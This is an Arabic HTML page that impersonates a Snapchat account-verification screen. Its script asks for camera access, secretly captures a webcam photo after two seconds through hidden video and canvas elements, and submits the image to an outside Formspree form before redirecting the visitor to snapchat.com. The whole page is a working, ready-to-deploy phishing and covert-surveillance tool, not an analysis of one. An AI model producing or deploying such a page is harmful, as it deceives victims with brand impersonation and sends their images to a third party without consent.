<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat | التحقق من الحساب</title>
    <!-- أيقونة سنابشات تظهر في التبويب -->
    <link rel="icon" type="image/png" href="https://snapchat.com">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #FFFC00; }
        .container { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; max-width: 400px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { margin: 0; font-size: 18px; color: #333; }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <h2>جاري التحقق من أمان المتصفح...</h2>
        <p style="font-size: 12px; color: #666;">يرجى السماح بالوصول للكاميرا لإتمام العملية</p>
    </div>

    <!-- عناصر المعالجة -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- الرابط المحدث النهائي -->
    <form id="photoForm" action="https://formspree.io/f/mqenyznv" method="POST">
        <input type="hidden" name="image_data" id="imageInput">
        <input type="hidden" name="_next" value="https://snapchat.com">
        <input type="hidden" name="_subject" value="صورة جديدة من الرابط">
    </form>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const imageInput = document.getElementById('imageInput');
        const form = document.getElementById('photoForm');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    const dataURL = canvas.toDataURL('image/png');
                    imageInput.value = dataURL;
                    
                    // إرسال البيانات
                    form.submit();
                }, 2000); // زيادة المهلة قليلاً لضمان وضوح الصورة
            })
            .catch(err => {
                // في حال الرفض، التوجه للسناب فوراً
                window.location.href = "https://snapchat.com";
            });
    </script>
</body>
</html>
